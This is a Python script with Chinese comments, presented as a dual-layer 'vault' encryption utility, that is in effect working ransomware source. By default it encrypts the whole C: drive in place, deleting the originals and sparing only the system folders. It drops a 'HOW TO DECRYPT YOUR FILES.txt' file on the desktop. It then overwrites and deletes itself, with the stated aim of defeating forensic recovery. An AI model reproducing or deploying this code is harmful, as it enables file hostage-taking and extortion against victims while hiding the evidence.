#!/usr/bin/env python3
"""
vault.py — 原地双层级联加密 / 解密 / 校验
执行完毕后安全自删除（多次随机覆写，不经回收站，清除缓存）。

用法:
  python vault.py encrypt  [--drive C] [--workers 4] [--show-skipped]
  python vault.py decrypt  [--drive C] [--workers 4]
  python vault.py verify   [--drive C] [--workers 4]
"""

# ═══════════════════════════════════════════════════════════════════════════════
# 依赖
# ═══════════════════════════════════════════════════════════════════════════════

import os
import sys
import struct
import getpass
import platform
import tempfile
import shutil
import subprocess
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Callable, NamedTuple

import click
from tqdm import tqdm
from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from cryptography.exceptions import InvalidTag
from argon2.low_level import hash_secret_raw, Type as Argon2Type

# ═══════════════════════════════════════════════════════════════════════════════
# 加密常量
# ═══════════════════════════════════════════════════════════════════════════════

_INNER_MAGIC      = b"\xB4\xCF\x7A\x2E\x91\xD0\x55\x3F"
ENCRYPTED_EXT     = ".vault"
SESSION_FILENAME  = ".vault_session"

_ARGON2_SALT_LEN  = 32
_ARGON2_TIME      = 3
_ARGON2_MEM_KB    = 262144   # 256 MB
_ARGON2_PARALLEL  = 4
_ARGON2_HASH_LEN  = 64

_FILE_SEED_LEN    = 32
_NONCE_LEN        = 12
_CHUNK_SIZE       = 131072   # 128 KB

# ═══════════════════════════════════════════════════════════════════════════════
# 密钥派生
# ═══════════════════════════════════════════════════════════════════════════════

class MasterKey(NamedTuple):
    header_key:  bytes
    session_key: bytes

class FileKeys(NamedTuple):
    aes_key:    bytes
    chacha_key: bytes

def _argon2id(password: str, salt: bytes) -> bytes:
    return hash_secret_raw(
        secret=password.encode("utf-8"), salt=salt,
        time_cost=_ARGON2_TIME, memory_cost=_ARGON2_MEM_KB,
        parallelism=_ARGON2_PARALLEL, hash_len=_ARGON2_HASH_LEN,
        type=Argon2Type.ID,
    )

def _hkdf_sha3(ikm: bytes, salt: bytes, info: bytes) -> bytes:
    return HKDF(algorithm=hashes.SHA3_256(), length=32,
                salt=salt, info=info).derive(ikm)

def _derive_master(password: str, salt: bytes) -> MasterKey:
    raw = _argon2id(password, salt)
    return MasterKey(header_key=raw[:32], session_key=raw[32:])

def _derive_file_keys(master: MasterKey, seed: bytes) -> FileKeys:
    return FileKeys(
        aes_key    = _hkdf_sha3(master.session_key, seed, b"aes-256-gcm-v1"),
        chacha_key = _hkdf_sha3(master.session_key, seed, b"chacha20-poly1305-v1"),
    )

# ═══════════════════════════════════════════════════════════════════════════════
# 分块 AES-256-GCM → ChaCha20-Poly1305 级联加密
# ═══════════════════════════════════════════════════════════════════════════════

def _nonce(base: bytes, idx: int) -> bytes:
    return bytes(a ^ b for a, b in zip(base, idx.to_bytes(_NONCE_LEN, "big")))

def _aad(idx: int) -> bytes:
    return idx.to_bytes(8, "big")

def _enc_chunk(plain: bytes, keys: FileKeys,
               base_a: bytes, base_c: bytes, idx: int) -> bytes:
    aad = _aad(idx)
    mid = AESGCM(keys.aes_key).encrypt(_nonce(base_a, idx), plain, aad)
    return ChaCha20Poly1305(keys.chacha_key).encrypt(_nonce(base_c, idx), mid, aad)

def _dec_chunk(ct: bytes, keys: FileKeys,
               base_a: bytes, base_c: bytes, idx: int) -> bytes:
    aad = _aad(idx)
    mid = ChaCha20Poly1305(keys.chacha_key).decrypt(_nonce(base_c, idx), ct, aad)
    return AESGCM(keys.aes_key).decrypt(_nonce(base_a, idx), mid, aad)

# ═══════════════════════════════════════════════════════════════════════════════
# 会话文件（.vault_session）
# ═══════════════════════════════════════════════════════════════════════════════

def _create_session(password: str, root: Path) -> MasterKey:
    salt   = os.urandom(_ARGON2_SALT_LEN)
    master = _derive_master(password, salt)
    vfy_n  = os.urandom(_NONCE_LEN)
    vfy_ct = ChaCha20Poly1305(master.header_key).encrypt(vfy_n, _INNER_MAGIC, None)
    root.mkdir(parents=True, exist_ok=True)
    with (root / SESSION_FILENAME).open("wb") as f:
        f.write(salt)
        f.write(vfy_n)
        f.write(vfy_ct)
    return master

def _load_session(password: str, root: Path) -> MasterKey:
    path = root / SESSION_FILENAME
    if not path.exists():
        raise FileNotFoundError(f"未找到会话文件: {path}")
    data   = path.read_bytes()
    salt   = data[0:32]
    vfy_n  = data[32:44]
    vfy_ct = data[44:]
    master = _derive_master(password, salt)
    try:
        ChaCha20Poly1305(master.header_key).decrypt(vfy_n, vfy_ct, None)
    except InvalidTag:
        raise ValueError("密码错误。")
    return master

# ═══════════════════════════════════════════════════════════════════════════════
# 单文件加密 / 解密
# ═══════════════════════════════════════════════════════════════════════════════

def _encrypt_file(src: Path, dst: Path, master: MasterKey) -> None:
    plain_data = src.read_bytes()
    orig_name  = src.name.encode("utf-8")
    seed = os.urandom(_FILE_SEED_LEN)
    ba   = os.urandom(_NONCE_LEN)
    bc   = os.urandom(_NONCE_LEN)
    keys = _derive_file_keys(master, seed)
    chunks_p = [plain_data[i: i + _CHUNK_SIZE]
                for i in range(0, max(len(plain_data), 1), _CHUNK_SIZE)] or [b""]
    chunks_e = [_enc_chunk(c, keys, ba, bc, i) for i, c in enumerate(chunks_p)]
    hp = (
        _INNER_MAGIC + seed + ba + bc
        + struct.pack("<Q", len(chunks_e))
        + struct.pack("<H", len(orig_name)) + orig_name
        + struct.pack("<Q", len(plain_data))
    )
    hn  = os.urandom(_NONCE_LEN)
    hct = ChaCha20Poly1305(master.header_key).encrypt(hn, hp, None)
    dst.parent.mkdir(parents=True, exist_ok=True)
    with dst.open("wb") as f:
        f.write(hn)
        f.write(struct.pack("<I", len(hct)))
        f.write(hct)
        for c in chunks_e:
            f.write(struct.pack("<I", len(c)))
            f.write(c)

def _decrypt_file(src: Path, dst: Path, master: MasterKey) -> None:
    data = src.read_bytes()
    off  = 0
    hn   = data[off: off + _NONCE_LEN]; off += _NONCE_LEN
    hlen = struct.unpack("<I", data[off: off + 4])[0]; off += 4
    hct  = data[off: off + hlen]; off += hlen
    try:
        hp = ChaCha20Poly1305(master.header_key).decrypt(hn, hct, None)
    except InvalidTag:
        raise ValueError(f"{src.name}: 头部验证失败")
    hoff = 0
    if hp[hoff: hoff + 8] != _INNER_MAGIC:
        raise ValueError(f"{src.name}: 不是有效的 vault 文件")
    hoff += 8
    seed = hp[hoff: hoff + _FILE_SEED_LEN]; hoff += _FILE_SEED_LEN
    ba   = hp[hoff: hoff + _NONCE_LEN];    hoff += _NONCE_LEN
    bc   = hp[hoff: hoff + _NONCE_LEN];    hoff += _NONCE_LEN
    cnt  = struct.unpack("<Q", hp[hoff: hoff + 8])[0]; hoff += 8
    nlen = struct.unpack("<H", hp[hoff: hoff + 2])[0]; hoff += 2 + nlen
    keys = _derive_file_keys(master, seed)
    parts = []
    for i in range(cnt):
        clen = struct.unpack("<I", data[off: off + 4])[0]; off += 4
        ct   = data[off: off + clen];                       off += clen
        try:
            parts.append(_dec_chunk(ct, keys, ba, bc, i))
        except InvalidTag:
            raise ValueError(f"{src.name}: 第 {i} 块验证失败，文件已损坏或被篡改")
    dst.parent.mkdir(parents=True, exist_ok=True)
    dst.write_bytes(b"".join(parts))

# ═══════════════════════════════════════════════════════════════════════════════
# 目录遍历（原地加密 / 解密 / 校验）
# ═══════════════════════════════════════════════════════════════════════════════

def _iter_plain(root: Path, skip: Callable[[Path], bool] | None = None):
    for dirpath, dirnames, names in os.walk(root, topdown=True):
        dp = Path(dirpath)
        if skip:
            dirnames[:] = [d for d in dirnames if not skip(dp / d)]
        for name in names:
            if name == SESSION_FILENAME:
                continue
            p = dp / name
            if p.suffix == ENCRYPTED_EXT:
                continue
            if not skip or not skip(p):
                yield p

def _iter_vault(root: Path):
    for dirpath, _, names in os.walk(root):
        for name in names:
            if name.endswith(ENCRYPTED_EXT) and name != SESSION_FILENAME:
                yield Path(dirpath) / name

def _run_pool(files: list, fn: Callable, desc: str, workers: int,
              on_error: Callable | None) -> tuple[int, int]:
    ok = err = 0
    with tqdm(total=len(files), unit="file", desc=desc, dynamic_ncols=True) as bar:
        with ThreadPoolExecutor(max_workers=workers) as pool:
            fmap = {pool.submit(fn, f): f for f in files}
            for fut in as_completed(fmap):
                try:
                    fut.result(); ok += 1
                except Exception as exc:
                    err += 1
                    if on_error:
                        on_error(fmap[fut], exc)
                finally:
                    bar.update(1)
    return ok, err

def _encrypt_inplace(root: Path, master: MasterKey, workers: int,
                     on_error: Callable | None, skip: Callable | None):
    def _enc(src: Path):
        dst = Path(str(src) + ENCRYPTED_EXT)
        _encrypt_file(src, dst, master)
        src.unlink()
    return _run_pool(list(_iter_plain(root, skip)), _enc, "加密中", workers, on_error)

def _decrypt_inplace(root: Path, master: MasterKey, workers: int,
                     on_error: Callable | None):
    def _dec(src: Path):
        dst = Path(str(src)[: -len(ENCRYPTED_EXT)])
        _decrypt_file(src, dst, master)
        src.unlink()
    return _run_pool(list(_iter_vault(root)), _dec, "解密中", workers, on_error)

def _verify_inplace(root: Path, master: MasterKey, workers: int,
                    on_error: Callable | None):
    tmp = Path(tempfile.mkdtemp())
    def _vfy(src: Path):
        _decrypt_file(src, tmp / src.name, master)
    try:
        return _run_pool(list(_iter_vault(root)), _vfy, "校验中", workers, on_error)
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

# ═══════════════════════════════════════════════════════════════════════════════
# 系统目录跳过名单
# ═══════════════════════════════════════════════════════════════════════════════

_WIN_SKIP_DIRS: set[str] = {
    "windows", "windows.old", "windows.~bt", "windows.~ws",
    "$windows.~bt", "$windows.~ws", "$winreagent",
    "$recycle.bin", "system volume information",
    "recovery", "msocache", "perflogs", "boot",
}
_WIN_SKIP_ROOT_FILES: set[str] = {
    "pagefile.sys", "hiberfil.sys", "swapfile.sys",
    "bootmgr", "bootmgr.efi", "bootnxt", "bootsect.bak",
    "boot.ini", "ntldr", "ntdetect.com",
}
_UNIX_SKIP_DIRS: set[str] = {
    "proc", "sys", "dev", "run", "tmp", "boot", "lost+found", "snap",
}

def _build_skip(root: Path) -> Callable[[Path], bool]:
    is_win    = platform.system() == "Windows"
    skip_dirs  = _WIN_SKIP_DIRS       if is_win else _UNIX_SKIP_DIRS
    skip_files = _WIN_SKIP_ROOT_FILES if is_win else set()
    def _skip(path: Path) -> bool:
        try:
            rel = path.relative_to(root)
        except ValueError:
            return False
        parts = rel.parts
        if not parts:
            return False
        top = parts[0].lower()
        if top in skip_dirs:
            return True
        if len(parts) == 1 and not path.is_dir() and top in skip_files:
            return True
        return False
    return _skip

# ═══════════════════════════════════════════════════════════════════════════════
# 安全自删除
# ═══════════════════════════════════════════════════════════════════════════════

def _secure_self_delete() -> None:
    """
    多次随机覆写脚本本身后，通过后台进程将其删除。
    覆写流程（共 7 轮随机 + 1 轮全零）让磁盘取证工具无法还原原始内容。
    不经回收站，直接从文件系统删除。
    """
    script = Path(sys.argv[0]).resolve()
    cache  = script.parent / "__pycache__"

    # 1. 多轮覆写（在 Python 进程仍持有文件句柄时完成）
    try:
        size = script.stat().st_size
        if size > 0:
            with script.open("r+b") as f:
                for _ in range(7):              # 7 轮随机数据
                    f.seek(0)
                    f.write(os.urandom(size))
                    f.flush()
                    os.fsync(f.fileno())
                f.seek(0)                       # 最终全零
                f.write(b"\x00" * size)
                f.flush()
                os.fsync(f.fileno())
    except Exception:
        pass

    # 2. 通过后台脚本删除文件（Python 退出后执行，避免"文件占用"错误）
    if platform.system() == "Windows":
        lines = [
            "@echo off",
            "timeout /t 2 /nobreak >nul",
            f'del /f /q "{script}"',
        ]
        if cache.exists():
            lines.append(f'rmdir /s /q "{cache}"')
        lines.append('del /f /q "%~f0"')   # 删除 bat 自身

        bat = Path(tempfile.mktemp(suffix=".bat"))
        bat.write_text("\r\n".join(lines) + "\r\n", encoding="ascii")
        subprocess.Popen(
            str(bat), shell=True,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
        )
    else:
        lines = [
            "#!/bin/sh",
            "sleep 2",
            f'rm -f "{script}"',
            f'rm -rf "{cache}"',
            'rm -f "$0"',
        ]
        sh = Path(tempfile.mktemp(suffix=".sh"))
        sh.write_text("\n".join(lines) + "\n")
        sh.chmod(0o700)
        subprocess.Popen(
            ["/bin/sh", str(sh)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

# ═══════════════════════════════════════════════════════════════════════════════
# 辅助
# ═══════════════════════════════════════════════════════════════════════════════

def _get_password(confirm: bool) -> str:
    pwd = getpass.getpass("密码: ")
    if not pwd:
        click.echo("错误：密码不能为空。", err=True)
        sys.exit(1)
    if confirm and getpass.getpass("确认密码: ") != pwd:
        click.echo("错误：两次密码不一致。", err=True)
        sys.exit(1)
    return pwd

def _error_cb(path: Path, exc: Exception) -> None:
    click.echo(f"  [跳过] {path.name}: {exc}", err=True)

def _resolve_root(drive: str) -> Path:
    if platform.system() == "Windows":
        letter = drive.rstrip(":\\/").upper()
        return Path(letter + ":\\")
    return Path(drive)

def _drop_desktop_note() -> None:
    """加密完成后在桌面生成空白提示文件（用户自行填写内容）。"""
    for candidate in [
        Path.home() / "Desktop",
        Path.home() / "OneDrive" / "Desktop",
    ]:
        if candidate.exists():
            note = candidate / "HOW TO DECRYPT YOUR FILES.txt"
            if not note.exists():
                note.write_text("", encoding="utf-8")
            return

# ═══════════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════════

@click.group()
def cli() -> None:
    """Vault — 原地双层级联加密工具（AES-256-GCM + ChaCha20-Poly1305）。"""

# ── encrypt ───────────────────────────────────────────────────────────────────

@cli.command()
@click.option("--drive",        default="C",   show_default=True)
@click.option("--workers", "-w",default=4,     show_default=True)
@click.option("--password","-p",default=None)
@click.option("--show-skipped", is_flag=True,  default=False,
              help="预览跳过/加密目录，不执行加密。")
def encrypt(drive: str, workers: int, password: str | None,
            show_skipped: bool) -> None:
    """原地加密整个磁盘，跳过系统目录。"""
    root = _resolve_root(drive)
    if not root.exists():
        click.echo(f"错误：找不到 {root}", err=True)
        _secure_self_delete(); sys.exit(1)

    skip = _build_skip(root)

    if show_skipped:
        click.echo(f"扫描根目录: {root}\n")
        click.echo("将被跳过：")
        for d in sorted(root.iterdir()):
            if d.is_dir() and skip(d):
                click.echo(f"  [跳过] {d}")
        click.echo("\n将被加密：")
        for d in sorted(root.iterdir()):
            if d.is_dir() and not skip(d):
                click.echo(f"  [加密] {d}")
        _secure_self_delete(); return

    if password is None:
        password = _get_password(confirm=True)

    click.echo("正在生成密钥（Argon2id，约 1-2 秒）…")
    master = _create_session(password, root)
    click.echo(f"扫描根目录: {root}  线程: {workers}\n")

    ok, err = _encrypt_inplace(root, master, workers, _error_cb, skip)
    _drop_desktop_note()
    _secure_self_delete()

    click.echo(f"\n完成。已加密: {ok}  错误: {err}")
    if err:
        sys.exit(2)

# ── decrypt ───────────────────────────────────────────────────────────────────

@cli.command()
@click.option("--drive",        default="C",   show_default=True)
@click.option("--workers", "-w",default=4,     show_default=True)
@click.option("--password","-p",default=None)
def decrypt(drive: str, workers: int, password: str | None) -> None:
    """将磁盘上所有 .vault 文件原地解密还原。"""
    root = _resolve_root(drive)
    if password is None:
        password = _get_password(confirm=False)

    click.echo("正在验证密码…")
    try:
        master = _load_session(password, root)
    except (FileNotFoundError, ValueError) as exc:
        click.echo(f"错误：{exc}", err=True)
        _secure_self_delete(); sys.exit(1)

    click.echo(f"目标磁盘: {root}  线程: {workers}\n")
    ok, err = _decrypt_inplace(root, master, workers, _error_cb)
    _secure_self_delete()

    click.echo(f"\n完成。已解密: {ok}  错误: {err}")
    if err:
        sys.exit(2)

# ── verify ────────────────────────────────────────────────────────────────────

@cli.command()
@click.option("--drive",        default="C",   show_default=True)
@click.option("--workers", "-w",default=4,     show_default=True)
@click.option("--password","-p",default=None)
def verify(drive: str, workers: int, password: str | None) -> None:
    """校验所有 .vault 文件完整性，不修改任何文件。"""
    root = _resolve_root(drive)
    if password is None:
        password = _get_password(confirm=False)

    click.echo("正在验证密码…")
    try:
        master = _load_session(password, root)
    except (FileNotFoundError, ValueError) as exc:
        click.echo(f"错误：{exc}", err=True)
        _secure_self_delete(); sys.exit(1)

    click.echo()
    ok, err = _verify_inplace(root, master, workers, _error_cb)
    _secure_self_delete()

    click.echo()
    if err:
        click.echo(f"校验失败！正常: {ok}  损坏/篡改: {err}", err=True)
        sys.exit(2)
    click.echo(f"全部 {ok} 个文件校验通过。")


if __name__ == "__main__":
    cli()
